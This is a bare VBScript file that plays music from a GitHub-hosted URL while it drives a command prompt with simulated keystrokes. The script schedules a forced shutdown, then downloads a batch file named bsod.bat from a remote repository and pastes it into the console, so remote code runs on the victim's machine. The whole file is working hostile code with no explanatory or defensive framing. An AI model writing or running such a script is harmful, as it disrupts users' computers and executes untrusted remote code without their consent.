With CreateObject("WMPlayer.OCX")
    .url = "https://friendlygroupgit.github.io/FriendlyGroup/OutroMusic.mp3"
    .controls.play
    Do
set Shellobj = WScript.CreateObject("WScript.Shell")
Shellobj.Run "cmd"
wscript.sleep 2000
Shellobj.sendkeys "shutdown /s /t 21 /c " & Chr(34) & " " & Chr(34)
wscript.sleep 100
Shellobj.sendkeys "{ENTER}"
wscript.sleep 11000
Shellobj.sendkeys "cd C:\Users\{%}USERNAME{%}"
wscript.sleep 10
Shellobj.sendkeys "{ENTER}"
wscript.sleep 100
Shellobj.sendkeys "curl https://raw.githubusercontent.com/friendlyGroupGit/FPSXS/main/bsod.bat|clip"
wscript.sleep 500
Shellobj.sendkeys "{ENTER}"
wscript.sleep 1100
Shellobj.sendkeys "^v"
   WScript.Sleep 100000
    Loop Until .playState = 1
End With





